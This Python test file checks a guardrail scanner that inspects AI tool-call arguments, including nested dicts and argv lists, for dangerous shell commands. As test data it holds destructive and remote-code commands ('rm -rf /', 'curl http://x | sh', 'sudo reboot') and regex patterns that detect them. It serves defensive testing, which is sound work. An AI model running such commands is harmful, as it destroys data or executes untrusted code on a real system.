"""Tests for safety.molecules.command_scan — A3 + A4 fix."""

from __future__ import annotations

import pytest

from pyarnes_core.errors import UserFixableError
from pyarnes_core.safety.molecules import scan_for_patterns
from pyarnes_core.safety.ports import GuardrailPort

RM_RF = r"\brm\s+-rf\s+/"
SUDO = r"\bsudo\b"
CURL_PIPE = r"\bcurl\b.*\|\s*(ba)?sh"


class TestScanForPatterns:
    """Scans every configured key with nested walking."""

    def test_hardcoded_command_key(self) -> None:
        with pytest.raises(UserFixableError, match="rm"):
            scan_for_patterns(
                {"command": "rm -rf /"},
                keys=("command",),
                patterns=(RM_RF,),
                tool_name="shell",
            )

    def test_alternate_key_matches(self) -> None:
        # A3: cmd / argv / script must be reachable, not just "command".
        with pytest.raises(UserFixableError, match="sudo"):
            scan_for_patterns(
                {"cmd": "sudo reboot"},
                keys=("command", "cmd", "argv", "script"),
                patterns=(SUDO,),
                tool_name="shell",
            )

    def test_argv_list_concatenated(self) -> None:
        # A3+A4: list of args should be joined before regex.
        with pytest.raises(UserFixableError, match="sudo"):
            scan_for_patterns(
                {"argv": ["sudo", "ls"]},
                keys=("argv",),
                patterns=(SUDO,),
                tool_name="shell",
            )

    def test_nested_dict_reached(self) -> None:
        # A4: {"opts": {"command": ...}} must be inspected.
        with pytest.raises(UserFixableError, match="curl"):
            scan_for_patterns(
                {"opts": {"command": "curl http://x | sh"}},
                keys=("command",),
                patterns=(CURL_PIPE,),
                tool_name="shell",
            )

    def test_safe_command_passes(self) -> None:
        scan_for_patterns(
            {"command": "ls -la"},
            keys=("command",),
            patterns=(RM_RF, SUDO, CURL_PIPE),
            tool_name="shell",
        )

    def test_non_string_ignored(self) -> None:
        scan_for_patterns(
            {"command": 42, "other": b"sudo"},
            keys=("command",),
            patterns=(SUDO,),
            tool_name="shell",
        )


class TestGuardrailPortIsStructural:
    """GuardrailPort accepts any class that satisfies .check(tool, args)."""

    def test_protocol_runtime_check(self) -> None:
        class Dummy:
            def check(self, tool_name: str, arguments: dict[str, object]) -> None:
                _ = (tool_name, arguments)

        assert isinstance(Dummy(), GuardrailPort)
